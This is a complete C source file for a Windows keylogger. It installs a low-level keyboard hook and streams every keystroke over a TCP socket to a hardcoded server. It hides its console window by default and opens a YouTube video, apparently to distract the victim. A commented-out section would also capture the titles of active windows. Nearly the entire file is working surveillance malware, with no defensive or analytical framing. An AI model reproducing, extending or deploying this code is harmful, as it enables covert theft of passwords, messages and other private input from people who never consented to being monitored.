#include <stdio.h>
#include <Windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <winsock2.h>

// define whether the window is visible or not
#define invisible // (visible/invisible)
#define ARR_LEN 29
#define SIZE 256


// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;


// global variables
HHOOK _hook;
int vkeys[] = {VK_BACK, VK_RETURN, VK_SPACE, VK_TAB, VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_CONTROL, VK_LCONTROL, VK_RCONTROL, VK_MENU, VK_LWIN, VK_RWIN, VK_ESCAPE, VK_END, VK_HOME, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN, VK_PRIOR, VK_NEXT, VK_OEM_PERIOD, VK_DECIMAL, VK_OEM_PLUS, VK_OEM_MINUS, VK_ADD, VK_SUBTRACT, VK_CAPITAL};
char vkeys_str[][20] = {"[BACKSPACE]","\n","_","[TAB]","[SHIFT]","[LSHIFT]","[RSHIFT]","[CONTROL]","[LCONTROL]","[RCONTROL]","[ALT]","[LWIN]","[RWIN]","[ESCAPE]","[END]","[HOME]","[LEFT]","[RIGHT]","[UP]","[DOWN]","[PG_UP]","[PG_DOWN]",".",".","+","-","+","-","[CAPS]"};


// global variales used to connect with server
char *ip = "127.0.0.1";
int port = 8080;
SOCKET client;


// connect to server
int connect_to_server(){

  int res;
  struct sockaddr_in server_addr;
  int e;
  // INITIALIZATION ===========================
  WSADATA wsaData;
  res = WSAStartup(MAKEWORD(2, 2), &wsaData);
  if (res)
  {
	printf("Startup failed: %d\n", res);
	return 1;
  }
  // ==========================================

  // SETUP CLIENT SOCKET ======================

  // construct socket
  client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (client == INVALID_SOCKET)
  {
	printf("Error with construction: %d\n", WSAGetLastError());
	WSACleanup();
	return 1;
  }

  
  printf("[+]Server socket created. \n");

  server_addr.sin_family = AF_INET;
  server_addr.sin_port = port;
  server_addr.sin_addr.s_addr = inet_addr(ip);

  e = connect(client, (struct sockaddr*)&server_addr, sizeof(server_addr));
  if(e == -1)
  {
	perror("[-]Error in Connecting");
	exit(1);
  }
  printf("[+]Connected to server.\n");
  return 0;
}


// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
  if (nCode >= 0)
  {
	// the action is valid: HC_ACTION.
	if (wParam == WM_KEYDOWN)
	{
	  // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
	  kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

	  Send_output(kbdStruct.vkCode);
	}
  }


  // call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
  return CallNextHookEx(_hook, nCode, wParam, lParam);
}


void SetHook()
{
  // Set the hook and set it to use the callback function above
  // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
  // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
  // function that sets and releases the hook.
  if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
  {
	LPCWSTR a = L"Failed to install hook!";
	LPCWSTR b = L"Error";
	MessageBox(NULL, a, b, MB_ICONERROR);
  }
}


// concatenates two strings
char* concat(const char *s1, const char *s2)
{
  char *result = malloc(strlen(s1) + strlen(s2) + 1); // +1 for the null-terminator
  strcpy(result, s1);
  strcat(result, s2);
  return result;
}


// looks for key stroke in array
// returns string if found
char* find(int key_stroke){
  for (int i = 0; i < ARR_LEN; i++) {
	if (i[vkeys] == key_stroke) return i[vkeys_str];
  }
  return "";
}


int Send_output(int key_stroke)
{
  char* output = (char*) malloc(64*sizeof(char));
  static char lastwindow[256] = "";

#ifndef mouseignore 
  if ((key_stroke == 1) || (key_stroke == 2))
  {
	return 0; // ignore mouse clicks
  }
#endif

  HWND foreground = GetForegroundWindow();
  DWORD threadID;
  HKL layout = NULL;

  // uncomment it if you want to see where the user is
  
  /* if (foreground) */
  /* { */
	/* // get keyboard layout of the thread */
	/* threadID = GetWindowThreadProcessId(foreground, NULL); */
	/* layout = GetKeyboardLayout(threadID); */
  /* } */

  /* if (foreground) */
  /* { */
	/* char window_title[256]; */
	/* GetWindowTextA(foreground, (LPSTR)window_title, 256); */

	/* if (strcmp(window_title, lastwindow) != 0) */
	/* { */
	  /* strcpy(lastwindow, window_title); */

	  /* // concat string XD */
	  /* char *tmp = concat(concat(concat("\n\n[Window: ",window_title)," - at "),"] "); */
	  /* if (strlen(tmp) >= 64) { */
		/* output = (char *) realloc(output, 2*sizeof(output)); */
		/* output = tmp; */
	  /* } */
	  /* else { */
		/* output = tmp; */
	/* send(client, output, strlen(output), 0); */
	  /* } */
	/* } */
  /* } */

  if (strcmp(find(key_stroke),""))
  {
	output = find(key_stroke);
	send(client, output, strlen(output), 0);
  }
  else
  {
	char key;
	// check caps lock
	bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

	// check shift key
	if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
		|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
	{
	  lowercase = !lowercase;
	}

	// map virtual key according to keyboard layout
	key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

	// tolower converts it to lowercase properly
	if (!lowercase)
	{
	  key = tolower(key);
	}
	output[0] = key;
	send(client, &output[0], sizeof(char), 0);
	free(output);
  }

  return 0;
}


// set window
void Stealth()
{
#ifdef visible
  ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
  ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif
}


// main start everything
int main () {
  // visibility of window
  Stealth();

  // play youtube 
  system("start https://www.youtube.com/watch?v=gQRg6FZLOD4");
  connect_to_server();

  // set the hook
  SetHook();

  // loop to keep the console application running.
  MSG msg;
  while (GetMessage(&msg, NULL, 0, 0)){}

  close(client);

  return 0;
}
